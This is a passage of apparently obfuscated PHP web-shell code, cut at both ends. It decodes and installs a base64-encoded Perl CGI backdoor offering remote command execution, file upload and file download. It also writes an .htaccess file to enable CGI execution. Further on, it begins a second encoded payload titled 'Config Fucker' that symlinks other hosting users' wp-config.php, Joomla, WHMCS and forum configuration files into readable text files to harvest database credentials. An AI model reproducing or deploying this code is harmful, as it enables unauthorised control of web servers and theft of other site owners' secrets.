LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIHJlYWRz
IHRoZSBzcGVjaWZpZWQgZmlsZSBmcm9tIHRoZSBkaXNrIGFuZCBzZW5kcyBpdCB0byB0aGUKIyBi
cm93c2VyLCBzbyB0aGF0IGl0IGNhbiBiZSBkb3dubG9hZGVkIGJ5IHRoZSB1c2VyLgojIEFyZ3Vt
ZW50IDE6IEZ1bGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBzZW50Lgoj
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBTZW5kRmlsZVRvQnJvd3Nlcgp7Cglsb2NhbCgkU2Vu
ZEZpbGUpID0gQF87CglpZihvcGVuKFNFTkRGSUxFLCAkU2VuZEZpbGUpKSAjIGZpbGUgb3BlbmVk
IGZvciByZWFkaW5nCgl7CgkJaWYoJFdpbk5UKQoJCXsKCQkJYmlubW9kZShTRU5ERklMRSk7CgkJ
CWJpbm1vZGUoU1RET1VUKTsKCQl9CgkJJEZpbGVTaXplID0gKHN0YXQoJFNlbmRGaWxlKSlbN107
CgkJKCRGaWxlbmFtZSA9ICRTZW5kRmlsZSkgPX4gIG0hKFteL15cXF0qKSQhOwoJCXByaW50ICJD
b250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtdW5rbm93blxuIjsKCQlwcmludCAiQ29udGVudC1M
ZW5ndGg6ICRGaWxlU2l6ZVxuIjsKCQlwcmludCAiQ29udGVudC1EaXNwb3NpdGlvbjogYXR0YWNo
bWVudDsgZmlsZW5hbWU9JDFcblxuIjsKCQlwcmludCB3aGlsZSg8U0VOREZJTEU+KTsKCQljbG9z
ZShTRU5ERklMRSk7Cgl9CgllbHNlICMgZmFpbGVkIHRvIG9wZW4gZmlsZQoJewoJCSZQcmludFBh
Z2VIZWFkZXIoImYiKTsKCQlwcmludCAiRmFpbGVkIHRvIGRvd25sb2FkICRTZW5kRmlsZTogJCEi
OwoJCSZQcmludEZpbGVEb3dubG9hZEZvcm07CgoJCSZQcmludFBhZ2VGb290ZXI7Cgl9Cn0KCgoj
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUg
dXNlciBkb3dubG9hZHMgYSBmaWxlLiBJdCBkaXNwbGF5cyBhIG1lc3NhZ2UKIyB0byB0aGUgdXNl
ciBhbmQgcHJvdmlkZXMgYSBsaW5rIHRocm91Z2ggd2hpY2ggdGhlIGZpbGUgY2FuIGJlIGRvd25s
b2FkZWQuCiMgVGhpcyBmdW5jdGlvbiBpcyBhbHNvIGNhbGxlZCB3aGVuIHRoZSB1c2VyIGNsaWNr
cyBvbiB0aGF0IGxpbmsuIEluIHRoaXMgY2FzZSwKIyB0aGUgZmlsZSBpcyByZWFkIGFuZCBzZW50
IHRvIHRoZSBicm93c2VyLgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBCZWdpbkRvd25sb2Fk
CnsKCSMgZ2V0IGZ1bGx5IHF1YWxpZmllZCBwYXRoIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2Fk
ZWQKCWlmKCgkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cXHxeLjovKSkgfAoJCSghJFdp
bk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXC8vKSkpICMgcGF0aCBpcyBhYnNvbHV0ZQoJewoJ
CSRUYXJnZXRGaWxlID0gJFRyYW5zZmVyRmlsZTsKCX0KCWVsc2UgIyBwYXRoIGlzIHJlbGF0aXZl
Cgl7CgkJY2hvcCgkVGFyZ2V0RmlsZSkgaWYoJFRhcmdldEZpbGUgPSAkQ3VycmVudERpcikgPX4g
bS9bXFxcL10kLzsKCQkkVGFyZ2V0RmlsZSAuPSAkUGF0aFNlcC4kVHJhbnNmZXJGaWxlOwoJfQoK
CWlmKCRPcHRpb25zIGVxICJnbyIpICMgd2UgaGF2ZSB0byBzZW5kIHRoZSBmaWxlCgl7CgkJJlNl
bmRGaWxlVG9Ccm93c2VyKCRUYXJnZXRGaWxlKTsKCX0KCWVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQg
b25seSB0aGUgbGluayBwYWdlCgl7CgkJJlByaW50RG93bmxvYWRMaW5rUGFnZSgkVGFyZ2V0Rmls
ZSk7Cgl9Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxl
ZCB3aGVuIHRoZSB1c2VyIHdhbnRzIHRvIHVwbG9hZCBhIGZpbGUuIElmIHRoZQojIGZpbGUgaXMg
bm90IHNwZWNpZmllZCwgaXQgZGlzcGxheXMgYSBmb3JtIGFsbG93aW5nIHRoZSB1c2VyIHRvIHNw
ZWNpZnkgYQojIGZpbGUsIG90aGVyd2lzZSBpdCBzdGFydHMgdGhlIHVwbG9hZCBwcm9jZXNzLgoj
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBVcGxvYWRGaWxlCnsKCSMgaWYgbm8gZmlsZSBpcyBz
cGVjaWZpZWQsIHByaW50IHRoZSB1cGxvYWQgZm9ybSBhZ2FpbgoJaWYoJFRyYW5zZmVyRmlsZSBl
cSAiIikKCXsKCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7CgkJJlByaW50RmlsZVVwbG9hZEZvcm07
CgkJJlByaW50UGFnZUZvb3RlcjsKCQlyZXR1cm47Cgl9CgkmUHJpbnRQYWdlSGVhZGVyKCJjIik7
CgoJIyBzdGFydCB0aGUgdXBsb2FkaW5nIHByb2Nlc3MKCXByaW50ICJVcGxvYWRpbmcgJFRyYW5z
ZmVyRmlsZSB0byAkQ3VycmVudERpci4uLjxicj4iOwoKCSMgZ2V0IHRoZSBmdWxsbHkgcXVhbGlm
aWVkIHBhdGhuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGNyZWF0ZWQKCWNob3AoJFRhcmdldE5hbWUp
IGlmICgkVGFyZ2V0TmFtZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOwoJJFRyYW5zZmVy
RmlsZSA9fiBtIShbXi9eXFxdKikkITsKCSRUYXJnZXROYW1lIC49ICRQYXRoU2VwLiQxOwoKCSRU
YXJnZXRGaWxlU2l6ZSA9IGxlbmd0aCgkaW57J2ZpbGVkYXRhJ30pOwoJIyBpZiB0aGUgZmlsZSBl
eGlzdHMgYW5kIHdlIGFyZSBub3Qgc3VwcG9zZWQgdG8gb3ZlcndyaXRlIGl0CglpZigtZSAkVGFy
Z2V0TmFtZSAmJiAkT3B0aW9ucyBuZSAib3ZlcndyaXRlIikKCXsKCQlwcmludCAiRmFpbGVkOiBE
ZXN0aW5hdGlvbiBmaWxlIGFscmVhZHkgZXhpc3RzLjxicj4iOwoJfQoJZWxzZSAjIGZpbGUgaXMg
bm90IHByZXNlbnQKCXsKCQlpZihvcGVuKFVQTE9BREZJTEUsICI+JFRhcmdldE5hbWUiKSkKCQl7
CgkJCWJpbm1vZGUoVVBMT0FERklMRSkgaWYgJFdpbk5UOwoJCQlwcmludCBVUExPQURGSUxFICRp
bnsnZmlsZWRhdGEnfTsKCQkJY2xvc2UoVVBMT0FERklMRSk7CgkJCXByaW50ICJUcmFuc2ZlcmVk
ICRUYXJnZXRGaWxlU2l6ZSBCeXRlcy48YnI+IjsKCQkJcHJpbnQgIkZpbGUgUGF0aDogJFRhcmdl
dE5hbWU8YnI+IjsKCQl9CgkJZWxzZQoJCXsKCQkJcHJpbnQgIkZhaWxlZDogJCE8YnI+IjsKCQl9
Cgl9CglwcmludCAiIjsKCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOwoKCSZQcmludFBhZ2VG
b290ZXI7Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxl
ZCB3aGVuIHRoZSB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZS4gSWYgdGhlCiMgZmlsZW5h
bWUgaXMgbm90IHNwZWNpZmllZCwgaXQgZGlzcGxheXMgYSBmb3JtIGFsbG93aW5nIHRoZSB1c2Vy
IHRvIHNwZWNpZnkgYQojIGZpbGUsIG90aGVyd2lzZSBpdCBkaXNwbGF5cyBhIG1lc3NhZ2UgdG8g
dGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluawojIHRocm91Z2ggIHdoaWNoIHRoZSBmaWxlIGNh
biBiZSBkb3dubG9hZGVkLgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBEb3dubG9hZEZpbGUK
ewoJIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwgcHJpbnQgdGhlIGRvd25sb2FkIGZvcm0gYWdh
aW4KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpCgl7CgkJJlByaW50UGFnZUhlYWRlcigiZiIpOwoJ
CSZQcmludEZpbGVEb3dubG9hZEZvcm07CgkJJlByaW50UGFnZUZvb3RlcjsKCQlyZXR1cm47Cgl9
CgkKCSMgZ2V0IGZ1bGx5IHF1YWxpZmllZCBwYXRoIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2Fk
ZWQKCWlmKCgkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cXHxeLjovKSkgfAoJCSghJFdp
bk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXC8vKSkpICMgcGF0aCBpcyBhYnNvbHV0ZQoJewoJ
CSRUYXJnZXRGaWxlID0gJFRyYW5zZmVyRmlsZTsKCX0KCWVsc2UgIyBwYXRoIGlzIHJlbGF0aXZl
Cgl7CgkJY2hvcCgkVGFyZ2V0RmlsZSkgaWYoJFRhcmdldEZpbGUgPSAkQ3VycmVudERpcikgPX4g
bS9bXFxcL10kLzsKCQkkVGFyZ2V0RmlsZSAuPSAkUGF0aFNlcC4kVHJhbnNmZXJGaWxlOwoJfQoK
CWlmKCRPcHRpb25zIGVxICJnbyIpICMgd2UgaGF2ZSB0byBzZW5kIHRoZSBmaWxlCgl7CgkJJlNl
bmRGaWxlVG9Ccm93c2VyKCRUYXJnZXRGaWxlKTsKCX0KCWVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQg
b25seSB0aGUgbGluayBwYWdlCgl7CgkJJlByaW50RG93bmxvYWRMaW5rUGFnZSgkVGFyZ2V0Rmls
ZSk7Cgl9Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBNYWluIFByb2dyYW0gLSBFeGVjdXRp
b24gU3RhcnRzIEhlcmUKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQomUmVhZFBhcnNlOwomR2V0Q29v
a2llczsKCiRTY3JpcHRMb2NhdGlvbiA9ICRFTlZ7J1NDUklQVF9OQU1FJ307CiRTZXJ2ZXJOYW1l
ID0gJEVOVnsnU0VSVkVSX05BTUUnfTsKJExvZ2luUGFzc3dvcmQgPSAkaW57J3AnfTsKJFJ1bkNv
bW1hbmQgPSAkaW57J2MnfTsKJFRyYW5zZmVyRmlsZSA9ICRpbnsnZid9OwokT3B0aW9ucyA9ICRp
bnsnbyd9OwoKJEFjdGlvbiA9ICRpbnsnYSd9OwokQWN0aW9uID0gImxvZ2luIiBpZigkQWN0aW9u
IGVxICIiKTsgIyBubyBhY3Rpb24gc3BlY2lmaWVkLCB1c2UgZGVmYXVsdAoKIyBnZXQgdGhlIGRp
cmVjdG9yeSBpbiB3aGljaCB0aGUgY29tbWFuZHMgd2lsbCBiZSBleGVjdXRlZAokQ3VycmVudERp
ciA9ICRpbnsnZCd9OwpjaG9wKCRDdXJyZW50RGlyID0gYCRDbWRQd2RgKSBpZigkQ3VycmVudERp
ciBlcSAiIik7CgokTG9nZ2VkSW4gPSAkQ29va2llc3snU0FWRURQV0QnfSBlcSAkUGFzc3dvcmQ7
CgppZigkQWN0aW9uIGVxICJsb2dpbiIgfHwgISRMb2dnZWRJbikgIyB1c2VyIG5lZWRzL2hhcyB0
byBsb2dpbgp7CgkmUGVyZm9ybUxvZ2luOwoKfQplbHNpZigkQWN0aW9uIGVxICJjb21tYW5kIikg
IyB1c2VyIHdhbnRzIHRvIHJ1biBhIGNvbW1hbmQKewoJJkV4ZWN1dGVDb21tYW5kOwp9CmVsc2lm
KCRBY3Rpb24gZXEgInVwbG9hZCIpICMgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlCnsKCSZV
cGxvYWRGaWxlOwp9CmVsc2lmKCRBY3Rpb24gZXEgImRvd25sb2FkIikgIyB1c2VyIHdhbnRzIHRv
IGRvd25sb2FkIGEgZmlsZQp7CgkmRG93bmxvYWRGaWxlOwp9CmVsc2lmKCRBY3Rpb24gZXEgImxv
Z291dCIpICMgdXNlciB3YW50cyB0byBsb2dvdXQKewoJJlBlcmZvcm1Mb2dvdXQ7Cn0=';
            $IIIIIIIllIlI = fopen('web.root', 'w+');
            $IIIIIIIllIll = fwrite($IIIIIIIllIlI, base64_decode($IIIIIIIllII1));
            fclose($IIIIIIIllIlI);
            chmod('web.root', 0755);
            echo '<iframe src=cgiweb/web.root width=100% height=600px frameborder=0></iframe> ';
        break;
        case 'config':
            mkdir('configweb', 0755);
            chdir('configweb');
            $IIIIIIIlI11I = '.htaccess';
            $IIIIIIIlI11l = "$IIIIIIIlI11I";
            $IIIIIIIlI111 = fopen($IIIIIIIlI11l, 'w') or die('Dosya a&#231;&#305;lamad&#305;!');
            $IIIIIIIllIII = 'Options FollowSymLinks MultiViews Indexes ExecCGI

AddType application/x-httpd-cgi .root

AddHandler cgi-script .root
AddHandler cgi-script .root';
            fwrite($IIIIIIIlI111, $IIIIIIIllIII);
            fclose($IIIIIIIlI111);
            $IIIIIIIllI1l = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluCnByaW50ICJDb250ZW50LXR5cGU6
IHRleHQvaHRtbFxuXG4iOwpwcmludCc8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFRE
IFhIVE1MIDEuMCBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIveGh0bWwx
L0RURC94aHRtbDEtdHJhbnNpdGlvbmFsLmR0ZCI+CjxodG1sIHhtbG5zPSJodHRwOi8vd3d3Lncz
Lm9yZy8xOTk5L3hodG1sIj4KPGhlYWQ+CjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtTGFuZ3Vh
Z2UiIGNvbnRlbnQ9ImVuLXVzIiAvPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNv
bnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCIgLz4KPHRpdGxlPkNvbmZpZyBGdWNrZXI8
L3RpdGxlPgo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPgouZHogewogICAgZm9udC1mYW1pbHk6IFRh
aG9tYTsKICAgIGZvbnQtc2l6ZTogMTRweDsKICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgY29s
b3I6ICMzMzMzZmY7CiAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICB0ZXh0LXNoYWRvdzogYmxh
Y2sgMHB4IDBweCAycHg7Cn0KI2NoZWNrb3V0dGV4dGFyZWEgewoKICB3ZWJraXQtYm9yZGVyLXJh
ZGl1czogMTVweDsKCn0KOmhvdmVyI2NoZWNrb3V0dGV4dGFyZWEge29wYWNpdHk6IDAuNjsgYmFj
a2dyb3VuZC1jb2xvcjozMzMzMzN9Cjwvc3R5bGU+CjwvaGVhZD4KJzsKc3ViIGxpbHsKICAgICgk
dXNlcikgPSBAXzsKJG1zciA9IHF4e3B3ZH07CiRrb2xhPSRtc3IuIi8iLiR1c2VyOwoka29sYT1+
cy9cbi8vZzsgCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9j
b25maWd1cmUucGhwJywka29sYS4nLXNob3AudHh0Jyk7CnN5bWxpbmsoJy9ob21lLycuJHVzZXIu
Jy9wdWJsaWNfaHRtbC9vcy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywka29sYS4nLXNob3Atb3Mu
dHh0Jyk7CnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbS9pbmNsdWRl
cy9jb25maWd1cmUucGhwJywka29sYS4nLW9zY29tLnR4dCcpOwpzeW1saW5rKCcvaG9tZS8nLiR1
c2VyLicvcHVibGljX2h0bWwvb3Njb21tZXJjZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywka29s
YS4nLW9zY29tbWVyY2UudHh0Jyk7CnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRt
bC9vc2NvbW1lcmNlcy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywka29sYS4nLW9zY29tbWVyY2Vz
LnR4dCcpOwpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2hvcC9pbmNsdWRl
cy9jb25maWd1cmUucGhwJywka29sYS4nLXNob3AyLnR4dCcpOwpzeW1saW5rKCcvaG9tZS8nLiR1
c2VyLicvcHVibGljX2h0bWwvc2hvcHBpbmcvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGtvbGEu
Jy1zaG9wLXNob3BwaW5nLnR4dCcpOwpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0
bWwvc2FsZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywka29sYS4nLXNhbGUudHh0Jyk7CnN5bWxp
bmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hbWVtYmVyL2NvbmZpZy5pbmMucGhwJywk
a29sYS4nLWFtZW1iZXIudHh0Jyk7CnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRt
bC9jb25maWcuaW5jLnBocCcsJGtvbGEuJy1hbWVtYmVyMi50eHQnKTsKc3ltbGluaygnL2hvbWUv
Jy4kdXNlci4nL3B1YmxpY19odG1sL21lbWJlcnMvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLict
bWVtYmVycy50eHQnKTsKc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZp
Zy5waHAnLCRrb2xhLictMi50eHQnKTsKc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19o
dG1sL2ZvcnVtL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLictZm9ydW0udHh0Jyk7CnN5bWxp
bmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bXMvaW5jbHVkZXMvY29uZmlnLnBo
cCcsJGtvbGEuJy1mb3J1bXMudHh0Jyk7CnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNf
aHRtbC9hZG1pbi9jb25mLnBocCcsJGtvbGEuJy01LnR4dCcpOwpzeW1saW5rKCcvaG9tZS8nLiR1
c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZmlnLnBocCcsJGtvbGEuJy00LnR4dCcpOwpzeW1s
aW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCcsJGtvbGEuJy13
cDEzLnR4dCcpOwpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd3Avd3AtY29u
ZmlnLnBocCcsJGtvbGEuJy13cDEzLXdwLnR4dCcpOwpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicv
cHVibGljX2h0bWwvV1Avd3AtY29uZmlnLnBocCcsJGtvbGEuJy13cDEzLVdQLnR4dCcpOwpzeW1s
aW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd3AvYmV0YS93cC1jb25maWcucGhwJywk
a29sYS4nLXdwMTMtd3AtYmV0YS50eHQnKTsKc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1Ymxp
Y19odG1sL2JldGEvd3AtY29uZmlnLnBocCcsJGtvbGEuJy13cDEzLWJldGEudHh0Jyk7CnN5bWxp
bmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcmVzcy93cC1jb25maWcucGhwJywka29s
YS4nLXdwMTMtcHJlc3MudHh0Jyk7CnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRt
bC93b3JkcHJlc3Mvd3AtY29uZmlnLnBocCcsJGtvbGEuJy13cDEzLXdvcmRwcmVzcy50eHQnKTsK
c3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL1dvcmRwcmVzcy93cC1jb25maWcu
cGhwJywka29sYS4nLXdwMTMtV29yZHByZXNzLnR4dCcpOwpzeW1saW5rKCcvaG9tZS8nLiR1c2Vy
LicvcHVibGljX2h0bWwvd29yZHByZXNzL2JldGEvd3AtY29uZmlnLnBocCcsJGtvbGEuJy13cDEz
LXdvcmRwcmVzcy1iZXRhLnR4dCcpOwpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0
bWwvbmV3cy93cC1jb25maWcucGhwJywka29sYS4nLXdwMTMtbmV3cy50eHQnKTsKc3ltbGluaygn
L2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ldy93cC1jb25maWcucGhwJywka29sYS4nLXdw
MTMtbmV3LnR4dCcpOwpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYmxvZy93
cC1jb25maWcucGhwJywka29sYS4nLXdwLWJsb2cudHh0Jyk7CnN5bWxpbmsoJy9ob21lLycuJHVz
ZXIuJy9wdWJsaWNfaHRtbC9iZXRhL3dwLWNvbmZpZy5waHAnLCRrb2xhLictd3AtYmV0YS50eHQn
KTsKc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2Jsb2dzL3dwLWNvbmZpZy5w
aHAnLCRrb2xhLictd3AtYmxvZ3MudHh0Jyk7CnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJs
aWNfaHRtbC9ob21lL3dwLWNvbmZpZy5waHAnLCRrb2xhLictd3AtaG9tZS50eHQnKTsKc3ltbGlu
aygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Byb3RhbC93cC1jb25maWcucGhwJywka29s
YS4nLXdwLXByb3RhbC50eHQnKTsKc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1s
L3NpdGUvd3AtY29uZmlnLnBocCcsJGtvbGEuJy13cC1zaXRlLnR4dCcpOwpzeW1saW5rKCcvaG9t
ZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbWFpbi93cC1jb25maWcucGhwJywka29sYS4nLXdwLW1h
aW4udHh0Jyk7CnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC90ZXN0L3dwLWNv
bmZpZy5waHAnLCRrb2xhLictd3AtdGVzdC50eHQnKTsKc3ltbGluaygnL2hvbWUvJy4kdXNlci4n
L3B1YmxpY19odG1sL2NvbmZfZ2xvYmFsLnBocCcsJGtvbGEuJy02LnR4dCcpOwpzeW1saW5rKCcv
aG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZS9kYi5waHAnLCRrb2xhLictNy50eHQn
KTsKc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2Nvbm5lY3QucGhwJywka29s
YS4nLTgudHh0Jyk7CnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ta19jb25m
LnBocCcsJGtvbGEuJy05LnR4dCcpOwpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0
bWwvaW5jbHVkZS9jb25maWcucGhwJywka29sYS4nLTEyLnR4dCcpOwpzeW1saW5rKCcvaG9tZS8n
LiR1c2VyLicvcHVibGljX2h0bWwvam9vbWxhL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWpv
b21sYTIudHh0Jyk7CnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcm90YWwv
Y29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictam9vbWxhLXByb3RhbC50eHQnKTsKc3ltbGluaygn
L2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2pvby9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEu
Jy1qb28udHh0Jyk7CnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbXMvY29u
ZmlndXJhdGlvbi5waHAnLCRrb2xhLictam9vbWxhLWNtcy50eHQnKTsKc3ltbGluaygnL2hvbWUv
Jy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGUvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictam9v
bWxhLXNpdGUudHh0Jyk7CnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYWlu
L2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWpvb21sYS1tYWluLnR4dCcpOwpzeW1saW5rKCcv
aG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3cy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEu
Jy1qb29tbGEtbmV3cy50eHQnKTsKc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1s
L25ldy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1qb29tbGEtbmV3LnR4dCcpOwpzeW1saW5r
KCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsJGtv
bGEuJy1qb29tbGEtaG9tZS50eHQnKTsKc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19o
dG1sL3ZiL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLictdmIudHh0Jyk7CnN5bWxpbmsoJy9o
b21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC92YjMvaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEu
Jy12YjMudHh0Jyk7CnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRl
cy9jb25maWcucGhwJywka29sYS4nLWluY2x1ZGVzLXZiLnR4dCcpOwpzeW1saW5rKCcvaG9tZS8n
LiR1c2VyLicvcHVibGljX2h0bWwvd2htL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLXdobTE1
LnR4dCcpOwpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2VudHJhbC9jb25m
aWd1cmF0aW9uLnBocCcsJGtvbGEuJy13aG0tY2VudHJhbC50eHQnKTsKc3ltbGluaygnL2hvbWUv
Jy4kdXNlci4nL3B1YmxpY19odG1sL3dobS93aG1jcy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEu
Jy13aG0td2htY3MudHh0Jyk7CnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93
aG0vV0hNQ1MvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictd2htLVdITUNTLnR4dCcpOwpzeW1s
aW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htYy9XSE0vY29uZmlndXJhdGlvbi5w
aHAnLCRrb2xhLictd2htYy1XSE0udHh0Jyk7CnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJs
aWNfaHRtbC93aG1jcy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy13aG1jcy50eHQnKTsKc3lt
bGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnQvY29uZmlndXJhdGlvbi5w
aHAnLCRrb2xhLictc3VwcG9ydC50eHQnKTsKc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1Ymxp
